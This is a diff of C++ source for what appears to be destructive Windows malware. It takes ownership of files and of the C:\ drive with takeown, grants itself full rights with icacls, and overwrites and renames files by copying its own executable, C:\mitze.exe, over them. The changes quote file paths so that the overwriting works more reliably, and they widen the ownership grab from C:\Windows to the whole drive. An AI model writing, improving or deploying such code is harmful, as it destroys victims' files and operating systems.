@@ -49,15 +49,16 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 				string Butter = "copy C:\\mitze.exe /Y "+ string(Chickfila);
 				const char* Sucker2 = Dutter.c_str();
 				const char* Sucker3 = Butter.c_str();
-				system((string("takeown /f "+string(Chickfila))).c_str());
-				system(("icacls "+string(Chickfila)+" /grant \045USERNAME\045:F").c_str());
+				system((string("takeown /f \""+string(Chickfila)+"\"")).c_str());
+				system(("icacls \""+string(Chickfila)+"\" /grant \045USERNAME\045:F").c_str());
 				//system(("del /f  "+ string(Chickfila)).c_str());
-				system(("copy C:\\mitze.exe /Y "+ string(Chickfila)).c_str());
+				system(("copy C:\\mitze.exe /Y \""+ string(Chickfila)+"\"").c_str());
 				rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
 				int num = 11;
 				int num2 = 69;
 				string Spac = " ";
 				Chain = "";
+				cout << string(Chickfila);
 				for(int i=0; i<num2; i++)
 				{
 					cout << "\n";
@@ -91,7 +92,7 @@ int main(int argc, char* argv[])
     string abc = "abcdefghijklmnopqrstuvwxyz"; 
     char char_array[abc.length() + 1]; 
     strcpy(char_array, abc.c_str());
-    system((string("takeown /f C:\\Windows")).c_str());
+    system((string("takeown /f C:\\")).c_str());
 	system((string("icacls C:\\Windows /grant \""+youser+"\":F")).c_str());
 	CopyFile("./a.exe","C:/mitze.exe",0);
 	CopyFile("./meow.mp3","C:/meow.mp3",0);
